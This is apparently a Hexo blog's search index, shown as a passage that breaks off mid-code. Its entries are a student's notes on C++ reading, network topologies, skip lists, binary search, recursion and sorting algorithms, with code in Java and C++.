<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Ruminations on C++]]></title>
    <url>%2F2018%2F11%2F06%2FRuminations-on-C%2F</url>
    <content type="text"><![CDATA[&#x7528;&#x4E86;&#x5341;&#x5929;&#x5DE6;&#x53F3;&#x7684;&#x65F6;&#x95F4;&#x628A;&#x300A;Ruminations on C++&#x300B;&#x8FD9;&#x672C;&#x4E66;&#x7ED9;&#x8BFB;&#x5B8C;&#x4E86;&#xFF0C;&#x81EA;&#x5DF1;&#x4EE5;&#x524D;&#x5E76;&#x6CA1;&#x6709;&#x611F;&#x89C9;&#x5230;C++&#x6709;&#x4EC0;&#x4E48;&#x96BE;&#x7406;&#x89E3;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x6211;&#x770B;&#x5B8C;&#x8FD9;&#x672C;&#x4E66;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x624D;&#x53D1;&#x73B0;&#x81EA;&#x5DF1;&#x771F;&#x7684;&#x662F;&#x5BF9;C++&#x4E00;&#x70B9;&#x90FD;&#x4E0D;&#x4E86;&#x89E3;&#x3002;&#x91CC;&#x9762;&#x7684;&#x5F88;&#x591A;&#x6982;&#x5FF5;&#x5BF9;&#x4E8E;&#x6211;&#x6765;&#x8BF4;&#x90FD;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x542C;&#x8BF4;&#xFF0C;&#x522B;&#x8BF4;&#x7406;&#x89E3;&#x4E86;&#x5C31;&#x7B97;&#x662F;&#x8BFB;&#x90FD;&#x5F88;&#x96BE;&#x8BFB;&#x61C2;&#x3002;&#x6BD4;&#x5982;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#xFF1A; 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;algorithm&gt;#include &lt;iostream&gt;using namespace std;class Test { public: Test(); Test(const Test&amp;); ~Test(); Test&amp; operator=(const Test&amp;); private: static int count; int id;};int Test::count = 0;Test::Test() { id = ++count; cout &lt;&lt; &quot;Test &quot; &lt;&lt; id &lt;&lt; &quot; default constructor&quot; &lt;&lt; endl;}Test::Test(const Test&amp; t) { id = ++count; cout &lt;&lt; &quot;Test &quot; &lt;&lt; id &lt;&lt; &quot; copied from &quot; &lt;&lt; t.id &lt;&lt; endl;}Test&amp; Test::operator=(const Test&amp; t) { cout &lt;&lt; &quot;Test &quot; &lt;&lt; id &lt;&lt; &quot; assigned from &quot; &lt;&lt; t.id &lt;&lt; endl; return *this;}Test::~Test() { cout &lt;&lt; &quot;Test &quot; &lt;&lt; id &lt;&lt; &quot; destroyed&quot; &lt;&lt; endl;}int main() { Test s; Test t(s); s = t;} &#x6700;&#x540E;&#x7684;&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A; &#x4EE5;&#x6211;&#x73B0;&#x5728;&#x7684;&#x77E5;&#x8BC6;&#x6211;&#x5B8C;&#x5168;&#x4E0D;&#x80FD;&#x7406;&#x89E3;&#x4E3A;&#x4EC0;&#x4E48;&#x7ED3;&#x679C;&#x4F1A;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x9762;&#x6839;&#x672C;&#x5C31;&#x6CA1;&#x6709;&#x8F93;&#x5165;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x6700;&#x540E;&#x8F93;&#x51FA;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x51FA;&#x73B0;1&#x548C;2&#xFF1F; &#x4E66;&#x4E0A;&#x8BF4;&#x8FD9;&#x91CC;&#x7528;&#x5230;&#x4E86;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x6790;&#x6784;&#x51FD;&#x6570;&#x548C;&#x8D4B;&#x503C;&#x64CD;&#x4F5C;&#x7B26;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x867D;&#x7136;&#x81EA;&#x5DF1;&#x628A;&#x4E66;&#x770B;&#x8FC7;&#x4E86;&#x4E00;&#x904D;&#xFF0C;&#x4F46;&#x662F;&#x5BF9;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x81EA;&#x5DF1;&#x8FD8;&#x771F;&#x7684;&#x4E0D;&#x7406;&#x89E3;&#x3002; &#x524D;&#x9762;&#x8FD8;&#x6709;&#x4E9B;&#x7AE0;&#x8282;&#x4ECB;&#x7ECD;&#x4E86;&#x53E5;&#x67C4;&#xFF0C;&#x8FED;&#x4EE3;&#x5668;&#xFF0C; &#x914D;&#x63A5;&#x5668;&#xFF0C; &#x63A5;&#x53E3;&#xFF0C; &#x5E93; &#x548C;&#x6A21;&#x677F;&#x7684;&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#xFF0C;&#x81EA;&#x5DF1;&#x4EE5;&#x524D;&#x5237;OJ&#x7684;&#x65F6;&#x5019;&#x5B8C;&#x5168;&#x7528;&#x4E0D;&#x5230;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x63A5;&#x89E6;&#x771F;&#x7684;&#x662F;&#x4E00;&#x5934;&#x96FE;&#x6C34;&#x3002; &#x901A;&#x8FC7;&#x8FD9;&#x672C;&#x4E66;&#x81EA;&#x5DF1;&#x867D;&#x7136;&#x6709;&#x5F88;&#x591A;&#x7684;&#x7591;&#x60D1;&#xFF0C;&#x4F46;&#x540C;&#x65F6;&#x4E5F;&#x8BA4;&#x8BC6;&#x5230;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x5F88;&#x591A;&#x4E0D;&#x8DB3;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Reading</category>
      </categories>
      <tags>
        <tag>Reading</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Computer Networks]]></title>
    <url>%2F2018%2F11%2F03%2FComputer-Networks%2F</url>
    <content type="text"><![CDATA[Network topologymash topology Advantages of this topology : robust. Fault is diagnosed easily. Provides security and privacy. Problems with this topology : Installation and configuration is difficult. suitable for less number of devices. Cost of maintenance is high. star topology Advantages of this topology : easy to set up. Each device require only 1 port. Problems with this topology : If the concentrator (hub) on which the whole topology relies fails, the whole system will crash down. Cost of installation is high. Performance is based on the single concentrator i.e. hub. bus topology Advantages of this topology : Cost of the cable is less as compared to other topology, but it is used to built small networks. Problems with this topology : If the common cable fails, then the whole system will crash down. If the network traffic is heavy, it increases collisions in the network. To avoid this, various protocols are used in MAC layer known as Pure Aloha, Slotted Aloha, CSMA/CD etc. ring topology : Advantages of this topology : The possibility of collision is minimum in this type of topology. Cheap to install and expand. Problems with this topology : Troubleshooting is difficult in this topology. Addition of stations in between or removal of stations can disturb the whole topology. Hybird topology A hybrid topology which is a combination of ring and star topology. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>computer network</category>
      </categories>
      <tags>
        <tag>computer network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C++ implementation student management system]]></title>
    <url>%2F2018%2F11%2F02%2FC-implemation-student-manager-system%2F</url>
    <content type="text"><![CDATA[&#x8FD9;&#x51E0;&#x5929;&#x4E00;&#x76F4;&#x5728;&#x770B;&#x300A;C++&#x6C89;&#x601D;&#x5F55;&#x300B;&#x8FD9;&#x672C;&#x4E66;&#xFF0C;&#x56E0;&#x4E3A;&#x4E4B;&#x524D;&#x4E00;&#x76F4;&#x6CA1;&#x6709;&#x63A5;&#x89E6;&#x8FC7;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7F16;&#x7A0B;&#xFF0C;&#x521A;&#x5F00;&#x59CB;&#x770B;&#x7684;&#x65F6;&#x5019;&#x611F;&#x89C9;&#x5F88;&#x96BE;&#x7406;&#x89E3;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x770B;&#x4E00;&#x773C;&#x5C31;&#x8FC7;&#x53BB;&#x4E86;&#x3002;&#x4ECA;&#x5929;&#x9759;&#x4E0B;&#x5FC3;&#x6765;&#x53C8;&#x770B;&#x4E86;&#x51E0;&#x9875;&#xFF0C;&#x53D1;&#x73B0;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x6709;&#x5F88;&#x591A;&#x7684;&#x4F18;&#x70B9;&#x3002;&#x4E8E;&#x662F;&#x4E4E;&#xFF0C;&#x81EA;&#x5DF1;&#x5C31;&#x5728;&#x5B9E;&#x9A8C;&#x697C;&#x4E0A;&#x627E;&#x4E86;&#x4E2A;&#x5173;&#x4E8E;c++&#x7684;&#x5B9E;&#x9A8C;&#x3002; &#x5728;&#x7F51;&#x4E0A;&#x627E;&#x4E86;&#x4E00;&#x4E2A;&#x5173;&#x4E8E;&#x5B66;&#x4E60;&#x91D1;&#x5B57;&#x5854;&#x7684;&#x56FE;&#x7247;&#x611F;&#x89C9;&#x5F88;&#x7B26;&#x5408;&#x81EA;&#x5DF1;&#x7684;&#x4EB2;&#x8EAB;&#x611F;&#x53D7;&#x3002;&#x771F;&#x7684;&#x60F3;&#x90A3;&#x53E5;&#x53E4;&#x8BD7;&#x8BF4;&#x7684;&#x4E00;&#x6837;&#x201C;&#x4E66;&#x4E0A;&#x5F97;&#x6765;&#x7EC8;&#x89C9;&#x6D45;&#xFF0C;&#x7EDD;&#x77E5;&#x6B64;&#x4E8B;&#x8981;&#x8EAC;&#x884C;&#x3002;&#x201D;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>c++</category>
      </categories>
      <tags>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hash Table]]></title>
    <url>%2F2018%2F10%2F31%2FHash-Table%2F</url>
    <content type="text"><![CDATA[document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SkipList]]></title>
    <url>%2F2018%2F10%2F30%2FSkipList%2F</url>
    <content type="text"><![CDATA[Using Java realize SkipList123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119package skiplist;import java.util.Random;/** * &#x8DF3;&#x8868;&#x7684;&#x4E00;&#x79CD;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;&#x3002; * &#x8DF3;&#x8868;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x6B63;&#x6574;&#x6570;&#xFF0C;&#x5E76;&#x4E14;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x4E0D;&#x91CD;&#x590D;&#x7684;&#x3002; * * Author&#xFF1A;ZHENG */public class SkipList { private static final int MAX_LEVEL = 16; private int levelCount = 1; private Node head = new Node(); // &#x5E26;&#x5934;&#x94FE;&#x8868; private Random r = new Random(); public Node find(int value) { Node p = head; for (int i = levelCount - 1; i &gt;= 0; --i) { while (p.forwords[i] != null &amp;&amp; p.forwords[i].data &lt; value) { p = p.forwords[i]; } } if (p.forwords[0] != null &amp;&amp; p.forwords[0].data == value) { return p.forwords[0]; } else { return null; } } public void insert(int value) { int level = randomLevel(); Node newNode = new Node(); newNode.data = value; newNode.maxLevel = level; Node update[] = new Node[level]; for (int i = 0; i &lt; level; ++i) { update[i] = head; } Node p = head; for (int i = level - 1; i &gt;= 0; --i) { while (p.forwords[i] != null &amp;&amp; p.forwords[i].data &lt; value) { p = p.forwords[i]; } update[i] = p; } for (int i = 0; i &lt; level; ++i) { newNode.forwords[i] = update[i].forwords[i]; update[i].forwords[i] = newNode; } if (levelCount &lt; level) levelCount = level; } public void delete(int value) { Node[] update = new Node[levelCount]; Node p = head; for (int i = levelCount - 1; i &gt;= 0; --i) { while (p.forwords[i] != null &amp;&amp; p.forwords[i].data &lt; value) { p = p.forwords[i]; } update[i] = p; } if (p.forwords[0] != null &amp;&amp; p.forwords[0].data == value) { for (int i = levelCount - 1; i &gt;= 0; --i) { if (update[i].forwords[i] != null &amp;&amp; update[i].forwords[i].data == value) { update[i].forwords[i] = update[i].forwords[i].forwords[i]; } } } } private int randomLevel() { int level = 1; for (int i = 1; i &lt; MAX_LEVEL; ++i) { if (r.nextInt() % 2 == 1) { level++; } } return level; } public void printAll() { Node p = head; while (p.forwords[0] != null) { System.out.print(p.forwords[0] + &quot; &quot;); p = p.forwords[0]; } System.out.println(); } public class Node { private int data = -1; private Node forwords[] = new Node[MAX_LEVEL]; private int maxLevel = 0; @Override public String toString() { StringBuilder builder = new StringBuilder(); builder.append(&quot;{ data: &quot;); builder.append(data); builder.append(&quot;; levels: &quot;); builder.append(maxLevel); builder.append(&quot; }&quot;); return builder.toString(); } }} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Binary Search]]></title>
    <url>%2F2018%2F10%2F30%2FBinary-Search%2F</url>
    <content type="text"><![CDATA[Using recursion to realize Binary Search1234567891011121314151617public int bsearch(int[] a, int n, int value) { int low = 0; int high = n - 1; while (low &lt;= high) { int mid = (low + high) / 2; if (a[mid] == value) { return mid; } else if (a[mid] &lt; value) { low = mid + 1; } else { high = mid - 1; } } return -1;} Using non-recursion to realize Binary Search1234567891011121314151617// &#x4E8C;&#x5206;&#x67E5;&#x627E;&#x7684;&#x9012;&#x5F52;&#x5B9E;&#x73B0;public int bsearch(int[] a, int n, int val) { return bsearchInternally(a, 0, n - 1, val);}private int bsearchInternally(int[] a, int low, int high, int value) { if (low &gt; high) return -1; int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] == value) { return mid; } else if (a[mid] &lt; value) { return bsearchInternally(a, mid+1, high, value); } else { return bsearchInternally(a, low, mid-1, value); }} find the first element which equal to the target numberclean code123456789101112131415public int bsearch(int[] a, int n, int value) { int low = 0; int high = n - 1; while (low &lt;= high) { int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] &gt;= value) { high = mid - 1; } else { low = mid + 1; } } if (a[low]==value) return low; else return -1;} easy understand code12345678910111213141516public int bsearch(int[] a, int n, int value) { int low = 0; int high = n - 1; while (low &lt;= high) { int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] &gt; value) { high = mid - 1; } else if (a[mid] &lt; value) { low = mid + 1; } else { if ((mid == 0) || (a[mid - 1] != value)) return mid; else high = mid - 1; } } return -1;} find the last element which equal to the target number12345678910111213141516public int bsearch(int[] a, int n, int value) { int low = 0; int high = n - 1; while (low &lt;= high) { int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] &gt; value) { high = mid - 1; } else if (a[mid] &lt; value) { low = mid + 1; } else { if ((mid == n - 1) || (a[mid + 1] != value)) return mid; else low = mid + 1; } } return -1;} find the fist element which more or equal to the target number1234567891011121314public int bsearch(int[] a, int n, int value) { int low = 0; int high = n - 1; while (low &lt;= high) { int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] &gt;= value) { if ((mid == 0) || (a[mid - 1] &lt; value)) return mid; else high = mid - 1; } else { low = mid + 1; } } return -1;} find the last element which less or equal to the target number1234567891011121314public int bsearch7(int[] a, int n, int value) { int low = 0; int high = n - 1; while (low &lt;= high) { int mid = low + ((high - low) &gt;&gt; 1); if (a[mid] &gt; value) { high = mid - 1; } else { if ((mid == n - 1) || (a[mid + 1] &gt; value)) return mid; else low = mid + 1; } } return -1;} how to get the number&#x2019;s square rootnewton&#x2019;s method1234567double sqr(double n) { double k=1.0; while(abs(k*k-n)&gt;1e-9) { k=(k+n/k)/2; } return k; } magic number1234567891011121314151617float Q_rsqrt( float number ){ long i; float x2, y; const float threehalfs = 1.5F; x2 = number * 0.5F; y = number; i = * ( long * ) &amp;y; // evil floating point bit level hacking i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck? y = * ( float * ) &amp;i; y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration // 2nd iteration, this can be removed // y = y * ( threehalfs - ( x2 * y * y ) ); return y;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Recursion]]></title>
    <url>%2F2018%2F10%2F28%2FRecursion%2F</url>
    <content type="text"><![CDATA[how to avoid stack overflow&#xFF1A;12345678910// &#x5168;&#x5C40;&#x53D8;&#x91CF;&#xFF0C;&#x8868;&#x793A;&#x9012;&#x5F52;&#x7684;&#x6DF1;&#x5EA6;&#x3002;int depth = 0;int f(int n) { ++depth&#xFF1B; if (depth &gt; 1000) throw exception; if (n == 1) return 1; return f(n-1) + 1;} how to avoid repeated calculation:12345678910111213public int f(int n) { if (n == 1) return 1; if (n == 2) return 2; // hasSolvedList &#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x6210;&#x4E00;&#x4E2A; Map&#xFF0C;key &#x662F; n&#xFF0C;value &#x662F; f(n) if (hasSolvedList.containsKey(n)) { return hasSovledList.get(n); } int ret = f(n-1) + f(n-2); hasSovledList.put(n, ret); return ret;} recursion convert non-recursion:recursion code&#xFF1A;12345int f(int n) { if (n == 1) return 1; if (n == 2) return 2; return f(n-1) + f(n-2);} non-recursion code&#xFF1A;1234567891011121314int f(int n) { if (n == 1) return 1; if (n == 2) return 2; int ret = 0; int pre = 2; int prepre = 1; for (int i = 3; i &lt;= n; ++i) { ret = pre + prepre; prepre = pre; pre = ret; } return ret;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sort]]></title>
    <url>%2F2018%2F10%2F28%2FSort%2F</url>
    <content type="text"><![CDATA[The questions about sort Bubble Sort:123456789101112131415161718// &#x5192;&#x6CE1;&#x6392;&#x5E8F;&#xFF0C;a &#x8868;&#x793A;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x5927;&#x5C0F;public void bubbleSort(int[] a, int n) { if (n &lt;= 1) return; for (int i = 0; i &lt; n; ++i) { // &#x63D0;&#x524D;&#x9000;&#x51FA;&#x5192;&#x6CE1;&#x5FAA;&#x73AF;&#x7684;&#x6807;&#x5FD7;&#x4F4D; boolean flag = false; for (int j = 0; j &lt; n - i - 1; ++j) { if (a[j] &gt; a[j+1]) { // &#x4EA4;&#x6362; int tmp = a[j]; a[j] = a[j+1]; a[j+1] = tmp; flag = true; // &#x8868;&#x793A;&#x6709;&#x6570;&#x636E;&#x4EA4;&#x6362; } } if (!flag) break; // &#x6CA1;&#x6709;&#x6570;&#x636E;&#x4EA4;&#x6362;&#xFF0C;&#x63D0;&#x524D;&#x9000;&#x51FA; }} Insert Sort:123456789101112131415161718// &#x63D2;&#x5165;&#x6392;&#x5E8F;&#xFF0C;a &#x8868;&#x793A;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x5927;&#x5C0F;public void insertionSort(int[] a, int n) { if (n &lt;= 1) return; for (int i = 1; i &lt; n; ++i) { int value = a[i]; int j = i - 1; // &#x67E5;&#x627E;&#x63D2;&#x5165;&#x7684;&#x4F4D;&#x7F6E; for (; j &gt;= 0; --j) { if (a[j] &gt; value) { a[j+1] = a[j]; // &#x6570;&#x636E;&#x79FB;&#x52A8; } else { break; } } a[j+1] = value; // &#x63D2;&#x5165;&#x6570;&#x636E; }} Insertion Sort List:123456789101112131415161718192021222324252627282930313233/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* insertionSortList(ListNode* head) { ListNode* dummy = new ListNode(0); ListNode* cur = head; dummy-&gt;next = head; ListNode* prev = NULL; ListNode* temp = NULL; while (cur != NULL &amp;&amp; cur-&gt;next != NULL) { if (cur-&gt;val &lt;= cur-&gt;next-&gt;val) { cur = cur-&gt;next; } else { temp = cur-&gt;next; cur-&gt;next = temp-&gt;next; prev = dummy; while (prev-&gt;next-&gt;val &lt;= temp-&gt;val) { prev = prev-&gt;next; } temp-&gt;next = prev-&gt;next; prev-&gt;next = temp; } } return dummy-&gt;next; }}; Sesection Sort:1234567891011public void sectionSort(int[] a, int n) { for (int i = 0; i &lt; n; ++i) { for (int j = i+1; j &lt; n; ++j) { if (a[i] &gt; a[j]) { int temp = a[i]; a[i] = a[j]; a[j] = temp; } } }} Why Insert sort more effictive than Bubble sort:1234567891011121314&#x5192;&#x6CE1;&#x6392;&#x5E8F;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x4EA4;&#x6362;&#x64CD;&#x4F5C;&#xFF1A;if (a[j] &gt; a[j+1]) { // &#x4EA4;&#x6362; int tmp = a[j]; a[j] = a[j+1]; a[j+1] = tmp; flag = true;}&#x63D2;&#x5165;&#x6392;&#x5E8F;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x79FB;&#x52A8;&#x64CD;&#x4F5C;&#xFF1A;if (a[j] &gt; value) { a[j+1] = a[j]; // &#x6570;&#x636E;&#x79FB;&#x52A8;} else { break;} Merge Sort:Recursive formula12345&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;merge_sort(p&#x2026;r) = merge(merge_sort(p&#x2026;q), merge_sort(q+1&#x2026;r))&#x7EC8;&#x6B62;&#x6761;&#x4EF6;&#xFF1A;p &gt;= r &#x4E0D;&#x7528;&#x518D;&#x7EE7;&#x7EED;&#x5206;&#x89E3; Fake Code:123456789101112131415161718// &#x5F52;&#x5E76;&#x6392;&#x5E8F;&#x7B97;&#x6CD5;, A &#x662F;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x5927;&#x5C0F;merge_sort(A, n) { merge_sort_c(A, 0, n-1)}// &#x9012;&#x5F52;&#x8C03;&#x7528;&#x51FD;&#x6570;merge_sort_c(A, p, r) { // &#x9012;&#x5F52;&#x7EC8;&#x6B62;&#x6761;&#x4EF6; if p &gt;= r then return // &#x53D6; p &#x5230; r &#x4E4B;&#x95F4;&#x7684;&#x4E2D;&#x95F4;&#x4F4D;&#x7F6E; q q = (p+r) / 2 // &#x5206;&#x6CBB;&#x9012;&#x5F52; merge_sort_c(A, p, q) merge_sort_c(A, q+1, r) // &#x5C06; A[p...q] &#x548C; A[q+1...r] &#x5408;&#x5E76;&#x4E3A; A[p...r] merge(A[p...r], A[p...q], A[q+1...r])} Merge function:12345678910111213141516171819202122232425merge(A[p...r], A[p...q], A[q+1...r]) { var i := p&#xFF0C;j := q+1&#xFF0C;k := 0 // &#x521D;&#x59CB;&#x5316;&#x53D8;&#x91CF; i, j, k var tmp := new array[0...r-p] // &#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x5927;&#x5C0F;&#x8DDF; A[p...r] &#x4E00;&#x6837;&#x7684;&#x4E34;&#x65F6;&#x6570;&#x7EC4; while i&lt;=q AND j&lt;=r do { if A[i] &lt;= A[j] { tmp[k++] = A[i++] // i++ &#x7B49;&#x4E8E; i:=i+1 } else { tmp[k++] = A[j++] } } // &#x5224;&#x65AD;&#x54EA;&#x4E2A;&#x5B50;&#x6570;&#x7EC4;&#x4E2D;&#x6709;&#x5269;&#x4F59;&#x7684;&#x6570;&#x636E; var start := i&#xFF0C;end := q if j&lt;=r then start := j, end:=r // &#x5C06;&#x5269;&#x4F59;&#x7684;&#x6570;&#x636E;&#x62F7;&#x8D1D;&#x5230;&#x4E34;&#x65F6;&#x6570;&#x7EC4; tmp while start &lt;= end do { tmp[k++] = A[start++] } // &#x5C06; tmp &#x4E2D;&#x7684;&#x6570;&#x7EC4;&#x62F7;&#x8D1D;&#x56DE; A[p...r] for i:=0 to r-p do { A[p+i] = tmp[i] }} merge sort list12345678910111213141516171819202122232425262728293031323334353637/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* sortList(ListNode* head) { if (head == NULL || head-&gt;next == NULL) return head; ListNode* fast = head-&gt;next; ListNode* slow = head; while (fast != NULL &amp;&amp; fast-&gt;next != NULL) { fast = fast-&gt;next-&gt;next; slow = slow-&gt;next; } ListNode* mid = slow-&gt;next; slow-&gt;next = NULL; return merge(sortList(head), sortList(mid)); }private: ListNode* merge(ListNode* l1, ListNode* l2) { ListNode dummy(0); ListNode* p = &amp;dummy; while (l1 &amp;&amp; l2) { if (l1-&gt;val &gt; l2-&gt;val) swap(l1, l2); p-&gt;next = l1; l1 = l1-&gt;next; p = p-&gt;next; } if (l1) p-&gt;next = l1; if (l2) p-&gt;next = l2; return dummy.next; }}; Quick Sort:recursive formula12345&#x9012;&#x63A8;&#x516C;&#x5F0F;&#xFF1A;quick_sort(p&#x2026;r) = quick_sort(p&#x2026;q-1) + quick_sort(q+1, r)&#x7EC8;&#x6B62;&#x6761;&#x4EF6;&#xFF1A;p &gt;= r Fake Code:123456789101112// &#x5FEB;&#x901F;&#x6392;&#x5E8F;&#xFF0C;A &#x662F;&#x6570;&#x7EC4;&#xFF0C;n &#x8868;&#x793A;&#x6570;&#x7EC4;&#x7684;&#x5927;&#x5C0F;quick_sort(A, n) { quick_sort_c(A, 0, n-1)}// &#x5FEB;&#x901F;&#x6392;&#x5E8F;&#x9012;&#x5F52;&#x51FD;&#x6570;&#xFF0C;p,r &#x4E3A;&#x4E0B;&#x6807;quick_sort_c(A, p, r) { if p &gt;= r then return q = partition(A, p, r) // &#x83B7;&#x53D6;&#x5206;&#x533A;&#x70B9; quick_sort_c(A, p, q-1) quick_sort_c(A, q+1, r)} partition function:1234567891011partition(A, p, r) { pivot := A[r] i := p for j := p to r-1 do { if A[j] &lt; pivot { swap A[i] with A[j] i := i+1 } } swap A[i] with A[r] return i counting sort1234567891011121314151617181920212223242526272829303132333435363738394041// &#x8BA1;&#x6570;&#x6392;&#x5E8F;&#xFF0C;a &#x662F;&#x6570;&#x7EC4;&#xFF0C;n &#x662F;&#x6570;&#x7EC4;&#x5927;&#x5C0F;&#x3002;&#x5047;&#x8BBE;&#x6570;&#x7EC4;&#x4E2D;&#x5B58;&#x50A8;&#x7684;&#x90FD;&#x662F;&#x975E;&#x8D1F;&#x6574;&#x6570;&#x3002;public void countingSort(int[] a, int n) { if (n &lt;= 1) return; // &#x67E5;&#x627E;&#x6570;&#x7EC4;&#x4E2D;&#x6570;&#x636E;&#x7684;&#x8303;&#x56F4; int max = a[0]; for (int i = 1; i &lt; n; ++i) { if (max &lt; a[i]) { max = a[i]; } } int[] c = new int[max + 1]; // &#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x8BA1;&#x6570;&#x6570;&#x7EC4; c&#xFF0C;&#x4E0B;&#x6807;&#x5927;&#x5C0F; [0,max] for (int i = 0; i &lt;= max; ++i) { c[i] = 0; } // &#x8BA1;&#x7B97;&#x6BCF;&#x4E2A;&#x5143;&#x7D20;&#x7684;&#x4E2A;&#x6570;&#xFF0C;&#x653E;&#x5165; c &#x4E2D; for (int i = 0; i &lt; n; ++i) { c[a[i]]++; } // &#x4F9D;&#x6B21;&#x7D2F;&#x52A0; for (int i = 1; i &lt;= max; ++i) { c[i] = c[i-1] + c[i]; } // &#x4E34;&#x65F6;&#x6570;&#x7EC4; r&#xFF0C;&#x5B58;&#x50A8;&#x6392;&#x5E8F;&#x4E4B;&#x540E;&#x7684;&#x7ED3;&#x679C; int[] r = new int[n]; // &#x8BA1;&#x7B97;&#x6392;&#x5E8F;&#x7684;&#x5173;&#x952E;&#x6B65;&#x9AA4;&#xFF0C;&#x6709;&#x70B9;&#x96BE;&#x7406;&#x89E3; for (int i = 